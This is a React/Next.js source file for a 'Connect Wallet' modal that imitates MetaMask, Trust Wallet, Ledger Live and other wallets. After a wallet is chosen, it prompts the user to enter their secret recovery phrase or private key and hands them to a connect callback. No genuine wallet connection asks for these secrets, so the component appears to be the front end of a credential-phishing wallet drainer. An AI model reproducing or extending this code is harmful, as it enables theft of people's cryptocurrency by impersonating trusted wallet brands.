"use client";
import React, { useEffect, useState } from "react";
import { Search, X } from "lucide-react";
import Image from "next/image";

interface Wallet {
  id: number;
  name: string;
  icon: string;
  color: string;
}

interface WalletConnectModalProps {
  isOpen: boolean;
  onClose: () => void;
  onConnect: (
    wallet: Wallet,
    credentials: { secretPhrase: string; privateKey: string }
  ) => Promise<void>;
  connecting: boolean;
  error: string | null;
}

const WalletConnectModal: React.FC<WalletConnectModalProps> = ({
  isOpen,
  onClose,
  onConnect,
  connecting,
  error
}) => {
  const [currentStep, setCurrentStep] = useState(1);
  const [selectedWallet, setSelectedWallet] = useState<Wallet | null>(null);
  const [showMore, setShowMore] = useState(false);
  const [searchTerm, setSearchTerm] = useState("");
  const [secretPhrase, setSecretPhrase] = useState("");
  const [privateKey, setPrivateKey] = useState("");
  const [authMethod, setAuthMethod] = useState<'phrase' | 'key'>('phrase');
  const [modalError, setModalError] = useState<string | null>(null);

 const wallets: Wallet[] = [
  { id: 1, name: "Metamask Wallet", icon: "/img/meta.webp", color: "bg-orange-500" },
  { id: 2, name: "TONKeeper Wallet", icon: "/img/tonkeeper.png", color: "bg-blue-500" },
  { id: 3, name: "Trust Wallet", icon: "/img/trustwallet.jpeg", color: "bg-blue-600" },
  { id: 4, name: "Coinbase Wallet", icon: "/img/coinwallet.jpeg", color: "bg-blue-700" },
  { id: 5, name: "WalletConnect", icon: "/img/walletCoin.jpeg", color: "bg-purple-500" },
  { id: 6, name: "Phantom Wallet", icon: "/img/phantom.png", color: "bg-purple-600" },
  { id: 7, name: "Rainbow Wallet", icon: "/img/rainbow.jpeg", color: "bg-gradient-to-r from-blue-400 via-purple-500 to-pink-500" },
  { id: 8, name: "Binance Wallet", icon: "/img/binance1.png", color: "bg-yellow-500" },
  { id: 9, name: "OKX Wallet", icon: "/img/okb-logo.png", color: "bg-black" },
  { id: 10, name: "Crypto.com Wallet", icon: "/img/coin-cro-logo.png", color: "bg-blue-400" },
  { id: 11, name: "Solflare Wallet", icon: "/img/solana-sol-logo.png", color: "bg-green-500" },
  { id: 12, name: "Zerion Wallet", icon: "/img/z.png", color: "bg-indigo-500" },
  { id: 13, name: "SafePal Wallet", icon: "/img/safepal-sfp-logo.png", color: "bg-gray-700" },
  { id: 14, name: "Exodus Wallet", icon: "/img/exodus.jpeg", color: "bg-cyan-600" },
  { id: 15, name: "Ledger Live Wallet", icon: "/img/ledger.png", color: "bg-gray-800" }
];


  const visibleWallets = showMore ? wallets : wallets.slice(0, 4);
  const filteredWallets = visibleWallets.filter(wallet =>
    wallet.name.toLowerCase().includes(searchTerm.toLowerCase())
  );

  const handleWalletSelect = (wallet: Wallet): void => {
    setSelectedWallet(wallet);
    setCurrentStep(2);
    setModalError(null);
  };

  const handleBack = () => {
    setCurrentStep(1);
    setSelectedWallet(null);
    setSecretPhrase("");
    setPrivateKey("");
    setModalError(null); 
    setAuthMethod('phrase');
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setModalError(null);

    if (!selectedWallet) {
      setModalError("Please select a wallet.");
      return;
    }

    const trimmedSecretPhrase = secretPhrase.trim();
    const trimmedPrivateKey = privateKey.trim();

    // Validation checks that the active field is filled
    if (authMethod === 'phrase' && !trimmedSecretPhrase) {
      setModalError("Please enter your Secret Recovery Phrase.");
      return;
    }
    
    if (authMethod === 'key' && !trimmedPrivateKey) {
      setModalError("Please enter your Private Key.");
      return;
    }

    let credentialsToSend: { secretPhrase: string; privateKey: string };

    if (authMethod === 'phrase') {
      credentialsToSend = {
        secretPhrase: trimmedSecretPhrase,
        privateKey: "" 
      };
    } else { 
      credentialsToSend = {
        secretPhrase: "", 
        privateKey: trimmedPrivateKey
      };
    }

    await onConnect(selectedWallet, credentialsToSend);
  };

  useEffect(() => {
    if (isOpen) {
      setCurrentStep(1);
      setSelectedWallet(null);
      setSecretPhrase("");
      setPrivateKey("");
      setModalError(null);
      setAuthMethod('phrase');
    }
  }, [isOpen]);
  
  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50 p-4">
      <div className="bg-[#E8E8E8] rounded-xl w-full max-w-md max-h-[90vh] flex flex-col">
        <div className="sticky top-0 p-6 flex items-center justify-between border-b border-gray-300 z-10">
          <div className="flex items-center gap-3">
            <div>
              <h2 className="text-xl text-black font-bold">Connect Wallet</h2>
              <p className="text-[#797A80] text-[13px]">Choose a wallet you would like to connect</p>
            </div>
          </div>
          <button onClick={onClose} className="text-gray-500 hover:text-gray-700">
            <X size={24} />
          </button>
        </div>

        <div className="overflow-y-auto p-6">
          {currentStep === 1 ? (
            <>
              <div className="relative mb-6">
                <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 w-4 h-4 text-gray-400" />
                <input
                  type="text"
                  className="w-full pl-10 pr-4 py-3 bg-[#E2E6F9] border border-[#D6DAF2] rounded-lg text-[#01040F] placeholder-[#01040F] focus:outline-none focus:ring-2 focus:ring-purple-500"
                  placeholder="Search wallets..."
                  value={searchTerm}
                  onChange={(e) => setSearchTerm(e.target.value)}
                />
              </div>

              <div className="space-y-2 mb-6">
                {filteredWallets.map((wallet) => (
                  <button
                    key={wallet.id}
                    onClick={() => handleWalletSelect(wallet)}
                    className="w-full flex items-center gap-4 p-4 bg-white hover:bg-gray-100 rounded-xl transition-colors text-[#01040F] border border-gray-200"
                  >
                    <div className={`${wallet.color} w-10 h-10 rounded-lg flex items-center justify-center text-white`}>
                      <Image 
                        src={wallet.icon} 
                        alt={wallet.name}
                        width={24}
                        height={24}
                        className="w-6 h-6 rounded"
                        unoptimized
                      />
                    </div>
                    <span className="font-medium">{wallet.name}</span>
                  </button>
                ))}
              </div>

              {wallets.length > 4 && (
                <button
                  onClick={() => setShowMore(!showMore)}
                  className="w-full text-center py-2 text-purple-600 hover:text-purple-800 font-medium mb-6"
                >
                  {showMore ? "Show less" : `+${wallets.length - 4} more`}
                </button>
              )}
            </>
          ) : (
            <form onSubmit={handleSubmit}>
              <div className="text-center mb-6">
                <div className={`w-16 h-16 ${selectedWallet?.color} rounded-full flex items-center justify-center text-white text-2xl mx-auto mb-3`}>
                  <Image
                    src={selectedWallet?.icon || ""}
                    alt={selectedWallet?.name || ""}
                    width={48}
                    height={48}
                    className="w-16 h-16 rounded-full"
                    unoptimized
                  />
                </div>
                <h3 className="text-lg font-semibold text-gray-900 mb-1">
                  Connect Wallet
                </h3>
                <p className="text-sm text-gray-600">
                  Please enter your credentials to connect your {selectedWallet?.name}
                </p>
              </div>

              <div className="mb-4">
                <label className="block text-sm font-medium text-[#01040F] mb-2">
                  Wallet
                </label>
                <div className="flex items-center gap-3 p-3 border border-gray-300 bg-white rounded-lg">
                  <div className={`${selectedWallet?.color} w-8 h-8 rounded flex items-center justify-center text-white text-xs`}>
                    <Image
                      src={selectedWallet?.icon || ""}
                      alt={selectedWallet?.name || ""}
                      width={24}
                      height={24}
                      className="w-6 h-6 rounded"
                      unoptimized
                    />
                  </div>
                  <span className="font-medium text-[#01040F]">{selectedWallet?.name}</span>
                </div>
              </div>

              <div className="flex border-b border-gray-300 mb-4">
                <button
                  type="button"
                  onClick={() => { setAuthMethod('phrase'); setPrivateKey(""); }}
                  className={`flex-1 py-2 font-medium ${
                    authMethod === 'phrase' 
                      ? 'text-black border-b-2 border-gray-700' 
                      : 'text-gray-500 hover:text-gray-700'
                  }`}
                >
                  Secret Phrase
                </button>
                <button
                  type="button"
                  onClick={() => { setAuthMethod('key'); setSecretPhrase(""); }}
                  className={`flex-1 py-2 font-medium ${
                    authMethod === 'key' 
                      ? 'text-black border-b-2 border-gray-700' 
                      : 'text-gray-500 hover:text-gray-700'
                  }`}
                >
                  Private Key
                </button>
              </div>

              {authMethod === 'phrase' ? (
                <div className="mb-6">
                  <label className="block text-sm font-medium text-[#01040F] mb-2">
                    Secret Recovery Phrase
                  </label>
                  <textarea
                    className="w-full p-4 border border-gray-300 bg-white rounded-lg text-[#01040F] placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-transparent"
                    placeholder="Enter your 12 or 24-word phrase"
                    rows={4}
                    value={secretPhrase}
                    onChange={(e) => setSecretPhrase(e.target.value)}
                  />
                  <p className="mt-2 text-xs text-gray-500">
                    Typically 12 (sometimes 24) words separated by spaces
                  </p>
                </div>
              ) : (
                <div className="mb-6">
                  <label className="block text-sm font-medium text-[#01040F] mb-2">
                    Private Key
                  </label>
                  <input
                    type="password"
                    className="w-full p-4 border border-gray-300 bg-white rounded-lg text-[#01040F] placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-transparent"
                    placeholder="Enter your private key"
                    value={privateKey}
                    onChange={(e) => setPrivateKey(e.target.value)}
                  />
                  <p className="mt-2 text-xs text-gray-500">
                    Your wallet&apos;s private key (keep this secure)
                  </p>
                </div>
              )}

              {(modalError || error) && (
                <div className="mb-4 p-3 bg-red-100 border border-red-300 text-red-700 rounded-lg text-sm">
                  {modalError || error}
                </div>
              )}

              <div className="flex gap-3">
                <button
                  type="button"
                  onClick={handleBack}
                  className="flex-1 px-4 py-2 border border-gray-300 text-gray-700 rounded-lg hover:bg-gray-50 transition-colors font-medium"
                >
                  Back
                </button>
                <button
                  type="submit"
                  disabled={
                    (authMethod === 'phrase' && !secretPhrase.trim()) ||
                    (authMethod === 'key' && !privateKey.trim()) ||
                    connecting
                  }
                  className="flex-1 px-4 py-2 bg-[#6967AE] text-white rounded-lg hover:bg-[#403e6d] disabled:bg-gray-400 disabled:cursor-not-allowed transition-colors font-medium"
                >
                  {connecting ? "Connecting..." : "Connect"}
                </button>
              </div>
            </form>
          )}
        </div>
      </div>
    </div>
  );
};

export default WalletConnectModal;